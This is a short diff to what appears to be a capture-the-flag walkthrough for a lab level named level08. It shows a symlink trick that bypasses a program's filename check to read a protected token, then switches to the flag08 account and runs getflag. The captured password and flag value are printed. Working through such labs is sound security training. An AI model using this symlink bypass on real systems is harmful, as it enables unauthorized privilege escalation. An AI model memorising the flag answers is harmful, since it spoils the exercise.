@@ -10,7 +10,7 @@ ln -s `pwd`/token /tmp/test
 # then we use to link to trick the program into reading the file
 ./level08 /tmp/test # > quif5eloekouj29ke0vouxean
 # escalate power level
-su level08
+su flag08
 quif5eloekouj29ke0vouxea
 # get next flag
 getflag # > 25749xKZ8L7DkSCwJkT9dyv6f
